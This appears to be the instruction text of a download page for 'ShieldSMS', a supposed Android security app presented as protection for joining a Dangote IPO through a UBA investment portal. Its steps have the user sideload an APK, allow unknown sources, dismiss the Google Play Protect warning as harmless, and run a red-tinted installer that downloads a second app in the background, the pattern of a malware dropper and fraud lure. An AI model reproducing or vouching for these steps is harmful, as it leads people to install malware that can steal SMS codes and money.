Getting Started — Read Before Downloading

Please read all steps carefully before tapping the download button. Following these instructions in order ensures a smooth and successful setup.

  1. Read these instructions first. Scroll through this entire guide before you proceed. Understanding the steps ahead will make the process quick and seamless.
  2. Tap the red "Download ShieldSMS Installer" button above. Your browser will begin downloading the installer file. Wait for the download to complete before proceeding.
  3. Open the downloaded file. Pull down your notification bar and tap the completed download, or navigate to your Downloads folder and tap ShieldSMS_Installer.apk to begin.
  4. Identify the correct app by its icon. The installer app icon has a red tint/overlay on it — this is intentional and helps you tell it apart from the main ShieldSMS security app which has a plain icon. Always open the red-tinted one first.
  5. Allow installation from unknown sources if prompted. Android may ask you to permit installation from outside the Play Store. Tap "Settings", enable "Allow from this source", then press back and tap "Install" again.
  6. Handle the Google Play Protect warning. A Play Protect dialog may appear saying the app was not recognised. Tap "More options" (or the three-dot menu), then select "Install anyway". This warning is standard for security apps distributed outside the Play Store and does not indicate a virus.
  7. The installer launches automatically. Once installed, open the ShieldSMS Installer (the red-tinted icon). It will immediately begin downloading and installing the main ShieldSMS security engine in the background. A progress bar will show you the status.
  8. Tap "Install" when the system prompt appears. After the download completes, Android will ask you to confirm the installation of the main app. Tap "Install" to proceed.
  9. If the download stops, use the Retry button. If your connection drops during the process, a red "Retry Download" button will appear on screen. Tap it to restart the download from the beginning — no need to reinstall anything.
  10. You are all set. Once installation is complete, the installer will close automatically. You may now proceed to the official UBA investment portal to participate in the Dangote IPO with your device fully secured.
